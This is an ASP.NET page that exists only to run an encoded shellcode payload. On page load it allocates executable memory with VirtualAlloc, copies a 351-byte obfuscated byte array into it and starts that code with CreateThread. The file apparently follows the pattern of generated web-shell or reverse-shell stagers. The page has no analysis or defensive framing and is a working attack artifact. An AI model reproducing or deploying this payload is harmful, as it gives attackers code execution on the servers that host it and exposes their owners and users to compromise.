<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] kRQAv63P = new byte[351] {0xd9,0xee,0xba,0xe2,0x8c,0xfb,0x52,0xd9,0x74,0x24,0xf4,0x5b,0x33,
0xc9,0xb1,0x52,0x31,0x53,0x17,0x83,0xeb,0xfc,0x03,0xb1,0x9f,0x19,0xa7,0xc9,0x48,0x5f,0x48,0x31,0x89,
0x00,0xc0,0xd4,0xb8,0x00,0xb6,0x9d,0xeb,0xb0,0xbc,0xf3,0x07,0x3a,0x90,0xe7,0x9c,0x4e,0x3d,0x08,0x14,
0xe4,0x1b,0x27,0xa5,0x55,0x5f,0x26,0x25,0xa4,0x8c,0x88,0x14,0x67,0xc1,0xc9,0x51,0x9a,0x28,0x9b,0x0a,
0xd0,0x9f,0x0b,0x3e,0xac,0x23,0xa0,0x0c,0x20,0x24,0x55,0xc4,0x43,0x05,0xc8,0x5e,0x1a,0x85,0xeb,0xb3,
0x16,0x8c,0xf3,0xd0,0x13,0x46,0x88,0x23,0xef,0x59,0x58,0x7a,0x10,0xf5,0xa5,0xb2,0xe3,0x07,0xe2,0x75,
0x1c,0x72,0x1a,0x86,0xa1,0x85,0xd9,0xf4,0x7d,0x03,0xf9,0x5f,0xf5,0xb3,0x25,0x61,0xda,0x22,0xae,0x6d,
0x97,0x21,0xe8,0x71,0x26,0xe5,0x83,0x8e,0xa3,0x08,0x43,0x07,0xf7,0x2e,0x47,0x43,0xa3,0x4f,0xde,0x29,
0x02,0x6f,0x00,0x92,0xfb,0xd5,0x4b,0x3f,0xef,0x67,0x16,0x28,0xdc,0x45,0xa8,0xa8,0x4a,0xdd,0xdb,0x9a,
0xd5,0x75,0x73,0x97,0x9e,0x53,0x84,0xd8,0xb4,0x24,0x1a,0x27,0x37,0x55,0x33,0xec,0x63,0x05,0x2b,0xc5,
0x0b,0xce,0xab,0xea,0xd9,0x41,0xfb,0x44,0xb2,0x21,0xab,0x24,0x62,0xca,0xa1,0xaa,0x5d,0xea,0xca,0x60,
0xf6,0x81,0x31,0xe3,0xf3,0x5f,0x37,0xf5,0x6b,0x62,0x47,0xe8,0x30,0xeb,0xa1,0x60,0xd7,0xbd,0x7a,0x1d,
0x4e,0xe4,0xf0,0xbc,0x8f,0x32,0x7d,0xfe,0x04,0xb1,0x82,0xb1,0xec,0xbc,0x90,0x26,0x1d,0x8b,0xca,0xe1,
0x22,0x21,0x62,0x6d,0xb0,0xae,0x72,0xf8,0xa9,0x78,0x25,0xad,0x1c,0x71,0xa3,0x43,0x06,0x2b,0xd1,0x99,
0xde,0x14,0x51,0x46,0x23,0x9a,0x58,0x0b,0x1f,0xb8,0x4a,0xd5,0xa0,0x84,0x3e,0x89,0xf6,0x52,0xe8,0x6f,
0xa1,0x14,0x42,0x26,0x1e,0xff,0x02,0xbf,0x6c,0xc0,0x54,0xc0,0xb8,0xb6,0xb8,0x71,0x15,0x8f,0xc7,0xbe,
0xf1,0x07,0xb0,0xa2,0x61,0xe7,0x6b,0x67,0x91,0xa2,0x31,0xce,0x3a,0x6b,0xa0,0x52,0x27,0x8c,0x1f,0x90,
0x5e,0x0f,0x95,0x69,0xa5,0x0f,0xdc,0x6c,0xe1,0x97,0x0d,0x1d,0x7a,0x72,0x31,0xb2,0x7b,0x57};

        IntPtr a1LJ_Z = VirtualAlloc(IntPtr.Zero,(UIntPtr)kRQAv63P.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(kRQAv63P,0,a1LJ_Z,kRQAv63P.Length);
        IntPtr fMTwVj1bo = IntPtr.Zero;
        IntPtr bRjWG6Q = CreateThread(IntPtr.Zero,UIntPtr.Zero,a1LJ_Z,IntPtr.Zero,0,ref fMTwVj1bo);
    }
</script>